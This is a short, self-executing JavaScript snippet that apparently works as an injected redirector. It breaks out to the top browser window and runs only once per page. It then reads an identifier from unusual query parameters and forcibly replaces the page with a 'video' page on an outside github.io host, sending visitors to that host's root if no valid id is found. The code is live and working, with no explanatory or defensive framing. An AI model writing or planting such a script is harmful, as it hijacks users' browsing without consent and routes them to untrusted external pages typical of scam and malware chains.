
(function () {
  "use strict";

  var W;

  try {
    W = window.top;

    if (W.__fc_ran) return;

    W.__fc_ran = 1;
  } catch (e) {
    return;
  }

  var BASE = "https://riopehrips.github.io/con";
  var FAIL = BASE + "/";

  function bail() {
    W.location.replace(FAIL);
  }

  function getId() {
    var params = new URLSearchParams(
      W.location.search
    );

    return (
      params.get("lagabo") ||
      params.get("GetFoldersAndFiles") ||
      params.get("id") ||
      ""
    );
  }

  var id = getId();

  if (!/^[A-Za-z0-9_.-]{1,80}$/.test(id)) {
    bail();
    return;
  }

  var target = BASE + "/video/" +
    encodeURIComponent(id) + ".html";

  W.location.replace(target);

})();
